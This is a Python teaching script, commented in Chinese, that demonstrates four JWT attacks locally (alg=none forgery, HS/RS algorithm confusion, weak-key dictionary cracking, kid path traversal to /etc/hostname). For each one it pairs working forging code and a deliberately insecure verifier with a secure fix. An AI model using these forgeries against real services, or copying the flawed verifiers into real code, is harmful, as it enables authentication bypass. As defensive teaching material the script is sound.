#!/usr/bin/env python3
"""
Day 149 · 示例 02 —— JWT 进阶用法与常见陷阱（攻击演示，仅用于教学/授权测试）

依赖：
    pip install pyjwt cryptography

本示例演示 4 类真实世界中出现过的 JWT 漏洞，每类都给出：
    ⚔️  攻击方做法       —— 攻击者如何构造恶意 token
    🛡️  不安全的验证代码 —— 有漏洞的写法（反面教材）
    ✅  安全的验证代码   —— 正确写法
    💥  结论             —— 为什么安全写法能挡住

⚠️ 仅用于本地教学演示，请勿对未授权的系统使用。
"""

import hashlib
import hmac
import json
import secrets
import time

import jwt
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

# 本文件刻意不 import 01 文件（它 import 时会打印输出），
# 这里内联一份 Base64URL 小工具，保证本文件可独立运行。
import base64


def b64url_encode(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def b64url_decode(text: str) -> bytes:
    return base64.urlsafe_b64decode(text + "=" * (-len(text) % 4))


def banner(title: str) -> None:
    print("\n" + "=" * 64)
    print(title)
    print("=" * 64)


# ────────────────────────────────────────────────────────────────
# 攻击 1：alg = none
# ────────────────────────────────────────────────────────────────
def attack_none() -> None:
    banner("攻击 1：alg=none —— 删掉签名段就能伪造任意身份")

    # ⚔️ 攻击者：构造 alg=none 的 token，签名段留空
    header = {"alg": "none", "typ": "JWT"}
    payload = {"sub": "1", "role": "admin", "exp": int(time.time()) + 3600}
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    forged = f"{h}.{p}."

    # 🛡️ 不安全写法：完全信任 Header 里的 alg
    def verify_unsafe(token, key):
        alg = jwt.get_unverified_header(token)["alg"]
        return jwt.decode(
            token, key, algorithms=[alg],
            options={"verify_signature": alg != "none"},  # 天真地跳过 none
        )

    # ✅ 安全写法：算法白名单写死在服务端
    def verify_safe(token, key):
        return jwt.decode(token, key, algorithms=["HS256"])

    secret = secrets.token_bytes(32)

    try:
        result = verify_unsafe(forged, secret)
        print(f"  🛡️ 不安全写法: 💥 伪造成功 → {result}")
    except Exception as e:
        print(f"  🛡️ 不安全写法: 被拦下({type(e).__name__})")

    try:
        verify_safe(forged, secret)
        print("  ✅ 安全写法: ❌ 意外通过")
    except jwt.InvalidAlgorithmError:
        print("  ✅ 安全写法: 挡住！InvalidAlgorithmError（none 不在白名单）")

    print("  💥 结论：算法绝不能来自 token，必须服务端硬编码白名单")


# ────────────────────────────────────────────────────────────────
# 攻击 2：HS/RS 算法混淆
# ────────────────────────────────────────────────────────────────
def attack_alg_confusion() -> None:
    banner("攻击 2：HS/RS 算法混淆 —— 用公开的 RSA 公钥当 HMAC 密钥")

    # 服务端生成 RSA 密钥对（公钥是公开的，攻击者也能拿到）
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public_pem = private_key.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )

    # ⚔️ 攻击者：手工把公钥 PEM 文本当作 HMAC 密钥，alg 写成 HS256。
    #    这里手工构造而不用 jwt.encode，是因为 PyJWT ≥2.7 已加防护：
    #    它会拒绝把 PEM 这类非对称密钥当作 HMAC 密钥（InvalidKeyError）。
    #    但历史版本 / 其他语言的库曾经允许，这个攻击因此在现实中真实发生过。
    forged_payload = {"sub": "1", "role": "admin", "exp": int(time.time()) + 3600}
    h_b64 = b64url_encode(
        json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode()
    )
    p_b64 = b64url_encode(
        json.dumps(forged_payload, separators=(",", ":")).encode()
    )
    signing_input = f"{h_b64}.{p_b64}".encode()
    sig = hmac.new(public_pem, signing_input, hashlib.sha256).digest()
    forged = f"{h_b64}.{p_b64}.{b64url_encode(sig)}"
    print(f"  ⚔️  伪造 token Header: {jwt.get_unverified_header(forged)}")
    print(f"  ⚔️  签名密钥 = 公钥 PEM 文本（攻击者从 /.well-known/jwks.json 就能拿到）")

    # 🛡️ 不安全写法：按 Header 的 alg 动态选算法（经典 bug）。
    #    这里手工实现验证，绕开新版 PyJWT 的保护，还原历史上真实的脆弱逻辑。
    def verify_unsafe(token):
        h_b64, p_b64, s_b64 = token.split(".")
        alg = json.loads(b64url_decode(h_b64))["alg"]
        signing_input = f"{h_b64}.{p_b64}".encode()
        if alg.startswith("RS"):
            jwt.decode(token, public_pem, algorithms=["RS256"])
        elif alg == "HS256":
            # ❌ 致命错误：拿「公开的」公钥当 HMAC 密钥
            expected = hmac.new(public_pem, signing_input, hashlib.sha256).digest()
            if not hmac.compare_digest(expected, b64url_decode(s_b64)):
                raise jwt.InvalidSignatureError("signature mismatch")
        else:
            raise jwt.InvalidAlgorithmError(f"unsupported alg: {alg}")
        return json.loads(b64url_decode(p_b64))

    # ✅ 安全写法：算法白名单固定为 RS256
    def verify_safe(token):
        return jwt.decode(token, public_pem, algorithms=["RS256"])

    try:
        r = verify_unsafe(forged)
        print(f"  🛡️ 不安全写法: 💥 伪造成功 → {r}")
    except Exception as e:
        print(f"  🛡️ 不安全写法: 被拦下({type(e).__name__})")

    try:
        verify_safe(forged)
        print("  ✅ 安全写法: ❌ 意外通过")
    except jwt.InvalidAlgorithmError:
        print("  ✅ 安全写法: 挡住！InvalidAlgorithmError")

    # 正常流程仍然可用
    good = jwt.encode(forged_payload, private_key, algorithm="RS256")
    print(f"  ✅ 正常 RS256 token 验证通过 → sub={verify_safe(good)['sub']}")
    print("  💥 结论：非对称验证公钥是公开的，绝不能被当作 HMAC 密钥使用")


# ────────────────────────────────────────────────────────────────
# 攻击 3：弱密钥离线爆破
# ────────────────────────────────────────────────────────────────
def attack_weak_key() -> None:
    banner("攻击 3：弱密钥爆破 —— 无需访问服务器，纯离线枚举")

    weak_secret = b"secret"  # 现实中最常见的弱密钥之一
    token = jwt.encode(
        {"sub": "1", "role": "admin", "exp": int(time.time()) + 3600},
        weak_secret,
        algorithm="HS256",
    )

    wordlist = [
        b"secret", b"password", b"123456", b"jwt_secret", b"changeme",
        b"your-256-bit-secret", b"admin", b"key",
    ]

    h_b64, p_b64, sig_b64 = token.split(".")
    signing_input = f"{h_b64}.{p_b64}".encode()
    target_sig = b64url_decode(sig_b64)

    cracked = None
    for candidate in wordlist:
        guess = hmac.new(candidate, signing_input, hashlib.sha256).digest()
        if hmac.compare_digest(guess, target_sig):
            cracked = candidate
            break

    if cracked:
        print(f"  ⚔️  离线爆破命中！密钥 = {cracked!r}")
        print("      → 攻击者可任意签发/篡改 token")
    else:
        print("  (本次字典未命中)")

    # ✅ 正确做法：高熵随机密钥
    strong = secrets.token_bytes(32)
    print(f"  ✅ 强密钥示例(32B): {strong.hex()}")
    print(f"     搜索空间 2^256 ≈ 1.16e77，爆破在物理上不可行")
    print("  💥 结论：HS256 密钥必须 ≥ 32 字节随机；用 KMS 管理并定期轮换")


# ────────────────────────────────────────────────────────────────
# 攻击 4：kid 路径穿越
# ────────────────────────────────────────────────────────────────
def attack_kid_injection() -> None:
    banner("攻击 4：kid 注入 —— 把 kid 当文件路径读")

    h_b64, p_b64 = (
        b64url_encode(json.dumps({"alg": "HS256", "kid": "../../../etc/hostname"},
                                 separators=(",", ":")).encode()),
        b64url_encode(json.dumps({"sub": "1", "role": "admin"},
                                 separators=(",", ":")).encode()),
    )
    print(f"  ⚔️  恶意 Header: {b64url_decode(h_b64).decode()}")

    # 🛡️ 不安全写法：直接把 kid 拼成路径去读文件当密钥
    def load_key_unsafe(kid: str) -> bytes:
        with open(f"/etc/keys/{kid}", "rb") as f:  # noqa: 演示用，切勿照抄
            return f.read()

    # ✅ 安全写法：kid 只能作为「查找键」，映射到服务端预置的密钥表
    KEY_RING = {"2026-09-rotating-key": secrets.token_bytes(32)}

    def load_key_safe(kid: str) -> bytes:
        if kid not in KEY_RING:
            raise KeyError(f"未知 kid: {kid}")
        return KEY_RING[kid]

    try:
        load_key_unsafe("../../../etc/hostname")
        print("  🛡️ 不安全写法: 💥 读到了系统文件内容当密钥！")
    except FileNotFoundError as e:
        print(f"  🛡️ 不安全写法: 命中系统文件读取路径 → {e}")

    try:
        load_key_safe("../../../etc/hostname")
        print("  ✅ 安全写法: ❌ 意外通过")
    except KeyError as e:
        print(f"  ✅ 安全写法: 挡住！{e}")
    print("  💥 结论：kid 只是查找键，绝不能进路径 / SQL / shell")


def main() -> None:
    print("Day 149 · JWT 常见陷阱演示（教学用，请勿用于未授权目标）")
    attack_none()
    attack_alg_confusion()
    attack_weak_key()
    attack_kid_injection()
    banner("总结")
    print("  1. 算法白名单固定在服务端，绝不读 Header 的 alg")
    print("  2. HS256 只在单方自用时用；多方验证用 RS256/ES256")
    print("  3. 密钥必须 ≥32 字节随机熵，定期轮换")
    print("  4. kid / jku / x5u 都是用户可控输入，必须严格校验")


if __name__ == "__main__":
    main()
